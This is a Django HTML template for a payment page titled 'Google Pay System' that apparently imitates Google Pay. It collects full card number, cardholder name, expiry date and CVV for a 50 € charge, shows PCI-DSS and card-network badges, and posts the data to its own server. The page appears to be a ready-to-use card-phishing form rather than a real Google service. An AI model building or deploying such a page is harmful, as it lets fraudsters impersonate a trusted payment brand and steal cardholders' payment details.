<!DOCTYPE html>
{% load static %}
<html lang="ru">
<head>
    <style rc-util-key="@ant-design-icons">
        .anticon {
            display: inline-block;
            color: inherit;
            font-style: normal;
            line-height: 0;
            text-align: center;
            text-transform: none;
            vertical-align: -0.125em;
            text-rendering: optimizeLegibility;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .anticon > * {
            line-height: 1;
        }

        .anticon svg {
            display: inline-block;
        }

        .anticon::before {
            display: none;
        }

        .anticon .anticon-icon {
            display: block;
        }

        .anticon[tabindex] {
            cursor: pointer;
        }

        .anticon-spin::before,
        .anticon-spin {
            display: inline-block;
            -webkit-animation: loadingCircle 1s infinite linear;
            animation: loadingCircle 1s infinite linear;
        }

        @-webkit-keyframes loadingCircle {
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }

        @keyframes loadingCircle {
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
    </style>
    <meta charset="utf-8">
    <link rel="icon" href="{% static 'images/favicon.png' %}">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="theme-color" content="#000000">
    <meta name="description" content="Web site created using create-react-app">
    <title>Google Pay System</title>
    <link href="{% static 'css/main.css' %}" rel="stylesheet">
</head>
<body>
<noscript>You need to enable JavaScript to run this app quietly.</noscript>
<div id="root">
    <form method="POST">
        <div class="invoice">
            <div class="ant-spin-nested-loading">
                <div class="ant-spin-container">
                    <div class="invoice-block">
                        <div class="invoice__wrapper">
                            <div class="wrapper__left card">
                                <div class="ant-spin-nested-loading">
                                    <div class="ant-spin-container">
                                        <div class="left-content">
                                            <div class="left-content__header">
                                                <div class="header ">
                                                    <div class="header__logo"><img src="{% static 'images/google-pay.svg' %}"
                                                                                   alt="logo"></div>
                                                </div>
                                                <div class="step__title"></div>
                                            </div>
                                            <div class="ant-spin-nested-loading">
                                                <div class="ant-spin-container">

                                                    <div class="ant-row ant-form-item"
                                                         style="margin-bottom: 16px; text-align: left; padding: 0px 20px;">
                                                        <div class="ant-col ant-form-item-control">
                                                            <div class="ant-form-item-control-input">
                                                                <div class="ant-form-item-control-input-content"><span
                                                                        class="invoice-card__top-title">Specify card details
                                                         </span>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="invoice-card__wrapper">
                                                        <div class="invoice-card__types-block">
                                                            <div class="invoice-card__types-block-item">

                                                                     fill="none" xmlns="http://www.w3.org/2000/svg"
                                                                     class="visa ">

                                                            </div>
                                                            <div class="invoice-card__types-block-item">

                                                                     class="mastercard ">

                                                                </svg>
                                                            </div>
                                                            <div class="invoice-card__types-block-item">

                                                                </svg>
                                                            </div>
                                                        </div>
                                                        <input type="hidden" name="amount" value="50">
                                                        <div class="ant-row ant-form-item ant-form-item-with-help invoice-card-input-mask ant-form-item-has-success">
                                                            <div class="ant-col ant-form-item-control">
                                                                <div class="ant-form-item-control-input">
                                                                    <div class="ant-form-item-control-input-content">
                                                                        <input name="from_card" autocomplete="_input0"
                                                                               maxlength="22" placeholder="Card number"
                                                                               class="form__input invoice-card- "
                                                                               id="number" value=""
                                                                               style="padding: 12px;" required="">
                                                                    </div>
                                                                </div>
                                                                <div class="ant-form-item-explain ant-form-item-explain-connected">
                                                                    <div role="alert"
                                                                         class="ant-form-item-explain-success"
                                                                         style=""></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="ant-row ant-form-item ant-form-item-with-help invoice-card-input-mask ant-form-item-has-success">
                                                            <div class="ant-col ant-form-item-control">
                                                                <div class="ant-form-item-control-input">
                                                                    <div class="ant-form-item-control-input-content">
                                                                        <input name="cardHolder"
                                                                               placeholder="Cardholder name"
                                                                               class="form__input invoice-card- "
                                                                               id="cardHolder" value=""
                                                                               style="padding: 12px;" required="">
                                                                    </div>
                                                                </div>
                                                                <div class="ant-form-item-explain ant-form-item-explain-connected">
                                                                    <div role="alert"
                                                                         class="ant-form-item-explain-success"
                                                                         style=""></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="ant-row ant-form-item" style="margin-bottom: 0px;">
                                                            <div class="ant-col ant-form-item-control">
                                                                <div class="ant-form-item-control-input">
                                                                    <div class="ant-form-item-control-input-content">
                                                                        <div class="ant-row ant-form-item"
                                                                             style="display: inline-block; width: calc(50% - 5px); max-width: 166px; float: left; margin-right: 5px;">
                                                                            <div class="ant-col ant-form-item-control">
                                                                                <div class="ant-form-item-control-input">
                                                                                    <div class="ant-form-item-control-input-content">
                                                                                        <input name="expired"
                                                                                               autocomplete="off"
                                                                                               placeholder="MM/YY"
                                                                                               id="expire"
                                                                                               class="form__input undefined card-value-expired"
                                                                                               value=""
                                                                                               style="padding: 12px;"
                                                                                               data-mask="00/00"
                                                                                               type="text" maxlength="5"
                                                                                               data-index="2"
                                                                                               required="">
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div class="ant-row ant-form-item"
                                                                             style="display: inline-block; width: calc(50% - 5px); max-width: 166px; float: right; margin-left: 5px;">
                                                                            <div class="ant-col ant-form-item-control">
                                                                                <div class="ant-form-item-control-input">
                                                                                    <div class="ant-form-item-control-input-content">
                                                                                        <input name="card_cvc"
                                                                                               maxlength="3"
                                                                                               type="password"
                                                                                               placeholder="CVV/CVC"
                                                                                               id="cvv"
                                                                                               class="form__input undefined "
                                                                                               value=""
                                                                                               style="padding: 12px;"
                                                                                               required=""></div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="ant-row ant-form-item ant-form-item-has-success"
                                                         style="padding: 0px 20px;">
                                                        <div class="ant-col ant-form-item-control">
                                                            <div class="ant-form-item-control-input">
                                                                <div class="ant-form-item-control-input-content">
                                                                    <button id="PayDollars" type="submit" class="btn btn-primary">Pay 50 €</button>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>

                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="wrapper__right" style="text-align: left;">
                                <div class="right-content">
                                    <div class="invoice-info__header">
                                        <div class="invoice-info__title">Amount:</div>
                                        <div class="invoice-info__value">50 €</div>
                                        <button class="btn-toggle">
                                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
                                                 xmlns="http://www.w3.org/2000/svg" class="btn-toggle-icon">
                                                <path fill-rule="evenodd" clip-rule="evenodd"
                                                      d="M5.2318 9.35984C5.58537 8.93556 6.21593 8.87824 6.64021 9.2318L12 13.6983L17.3598 9.2318C17.7841 8.87824 18.4147 8.93556 18.7682 9.35984C19.1218 9.78412 19.0645 10.4147 18.6402 10.7682L12.6402 15.7682C12.2694 16.0773 11.7307 16.0773 11.3598 15.7682L5.35984 10.7682C4.93556 10.4147 4.87824 9.78412 5.2318 9.35984Z"
                                                      fill="#252129"></path>
                                            </svg>
                                        </button>
                                    </div>
                                    <div class="invoice-info__wrapper" style="height: 0px; overflow: hidden;">
                                        <div class="invoice-info-body">
                                            <div class="invoice-info__top-block">
                                                <div class="invoice-info__comment">
                                                    <label class="comment__title">Checkout</label>
                                                    <div class="comment__description">#27733858</div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="bottom__info-wrapper">
                        <div class="certificates"><span class="svg-wrapper-icon" id="pci-dss-svg"
                                                        alt="PCI-DSS"></span><span class="svg-wrapper-icon"
                                                                                   id="mastercard-svg"
                                                                                   alt="mastercardSecure"></span><span
                                class="svg-wrapper-icon" id="visa-svg" alt="VisaVerified"></span></div>
                    </div>
                </div>
            </div>
        </div>
    </form>

</div>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="{% static 'js/payment/step3/index.js' %}"></script>
</body>
</html>
